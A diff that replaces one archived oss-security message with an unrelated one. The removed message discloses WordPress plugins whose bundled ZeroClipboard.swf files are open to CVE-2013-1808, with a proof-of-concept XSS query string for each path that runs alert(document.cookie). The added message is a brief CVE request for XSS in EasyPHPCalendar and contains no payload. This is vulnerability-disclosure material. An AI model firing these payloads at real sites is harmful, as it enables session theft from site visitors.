@@ -1,146 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/10/2
-Message-ID: <20130310085207.GA5220@kludge.henri.nerv.fi>
-Date: Sun, 10 Mar 2013 10:52:07 +0200
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/13/1
+Message-ID: <CAE5KnOdQXB56FB1t19Pr7=5aQazATba8-uiEDJ3D2ZdM-ahqmg@mail.gmail.com>
+Date: Sat, 13 Apr 2013 05:17:39 +0530
+From: Anant Shrivastava <anant@...ntshri.info>
 To: oss-security@...ts.openwall.com
-Cc: plugins@...dpress.org
-Subject: WordPress plugins vulnerable to CVE-2013-1808
+Subject: CVE for XSS in EasyPHPCalender script
 Content-Type: text/plain; charset=utf-8
 
-Hello list members,
+Hi Team,
 
-I tested WordPress plugins to see which are vulnerable to CVE-2013-1808, because
-original founder of this vulnerability did not, which is irresponsible
-disclosure in my opinion.
+can i please have a CVE for this issues
 
-Plugin doesn't need to be actived to be vulnerable. Only tested trunk. Some of
-these have already been reported to WordPress plugins-address via email.
+http://www.easyphpcalendar.com/forums/showthread.php?p=45554#post45554
 
-Not vulnerable 2013-03-10:
-    yandex-add-url
-    web2print-beta
-    q2w3-inc-manager
+technical details are not issued however the two issues are pertaining to
+XSS in following two files in the package.
 
-Not found in plugin-install.php search 2013-03-10. Reason for this might be that
-someone already reported these:
-    wpmob-lite
-    search-and-share
-    scorerender
-    savingscom-coupon-plugin-and-widget
-    lb-mixed-slideshow
-    java-trackback
-    ed2k-link-selector
-    drp-coupon
-    coupon-code-plugin
-    bookings-plus
+index.php
+datePicker.php
 
-Please contact me in case you need more information. List of affected plugins:
+This issue affect both free version i.e. version 6.
+as well as commerical version < 7.0.13
 
-Plugin: wp-link-to-us
-Version: 2.0 1
-Reported to WordPress plugins-address: 2013-02-03
+Changelog visible here for v7 :
+http://docs7.easyphpcalendar.com/source/ChangeLog/changeLog.htm
+for v6 patch is listed here :http://www.easyphpcalendar.com/v6download.php
+ as  Security Patch - Released April 9,
+2013<http://www.easyphpcalendar.com/files/EPC6Patch.zip>
 
-Affected file: http://plugins.svn.wordpress.org/wp-link-to-us/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/wp-link-to-us/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+Thanks in advance.
 
-Affected file: http://plugins.svn.wordpress.org/wp-link-to-us/trunk/js/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
-PoC: wp-content/plugins/wp-link-to-us/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
------
-Plugin: zopim-live-chat
-Version: 1.2.5
-Reported to WordPress plugins-address: 2013-02-03
+-Anant
 
-Affected file: http://plugins.svn.wordpress.org/zopim-live-chat/trunk/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/zopim-live-chat/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
------
-Plugin: wppygments
-Version: 0.3.2
-Reported to WordPress plugins-address: 2013-02-03
-
-Affected file: http://plugins.svn.wordpress.org/wppygments/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/wppygments/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
-
-Affected file: http://plugins.svn.wordpress.org/wppygments/trunk/js/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
-PoC: wp-content/plugins/wppygments/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
------
-Plugin: wp-clone-by-wp-academy
-Version: 2.1.1
-Reported to WordPress plugins-address: 2013-02-03
-
-Affected file: http://plugins.svn.wordpress.org/wp-clone-by-wp-academy/trunk/lib/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/wp-clone-by-wp-academy/lib/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
------
-Plugin: tiny-url
-Version: 1.3.2
-
-Affected file: http://plugins.svn.wordpress.org/tiny-url/trunk/swf/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
-PoC: wp-content/plugins/tiny-url/swf/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: thethe-layout-grid
-Version: 1.0.0
-
-Affected file: http://plugins.svn.wordpress.org/thethe-layout-grid/trunk/style/admin/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/thethe-layout-grid/style/admin/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: slidedeck2
-Version: 2.1.20130306
-
-Affected file: http://plugins.svn.wordpress.org/slidedeck2/trunk/js/zeroclipboard/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
-
-Affected file: http://plugins.svn.wordpress.org/slidedeck2/trunk/js/zeroclipboard/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
-PoC: wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: paypal-digital-goods-monetization-powered-by-cleeng
-Version: 2.2.13
-
-Affected file: http://plugins.svn.wordpress.org/paypal-digital-goods-monetization-powered-by-cleeng/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/paypal-digital-goods-monetization-powered-by-cleeng/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: mobileview
-Version: 1.0.7
-
-Affected file: http://plugins.svn.wordpress.org/mobileview/trunk/admin/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/mobileview/admin/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: jaspreetchahals-coupons-lite
-Version: 2.1
-
-Affected file: http://plugins.svn.wordpress.org/jaspreetchahals-coupons-lite/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/jaspreetchahals-coupons-lite/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: geshi-source-colorer
-Version: 0.13
-
-Affected file: http://plugins.svn.wordpress.org/geshi-source-colorer/trunk/external/zeroclipboard/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/geshi-source-colorer/external/zeroclipboard/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: click-to-copy-grab-box
-Version: 0.1.1
-
-Affected file: http://plugins.svn.wordpress.org/click-to-copy-grab-box/trunk/lib/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/click-to-copy-grab-box/lib/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
-
-Affected file: http://plugins.svn.wordpress.org/click-to-copy-grab-box/trunk/lib/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
-PoC: wp-content/plugins/click-to-copy-grab-box/lib/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: cleeng
-Version: 2.3.2
-
-Affected file: http://plugins.svn.wordpress.org/cleeng/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/cleeng/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: buckets
-Version: 0.1.9.3
-
-Affected file: http://plugins.svn.wordpress.org/buckets/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/buckets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
------
-Plugin: bp-code-snippets
-Version: 2.0
-
-Affected file: http://plugins.svn.wordpress.org/bp-code-snippets/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
-PoC: wp-content/plugins/bp-code-snippets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
-
-Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
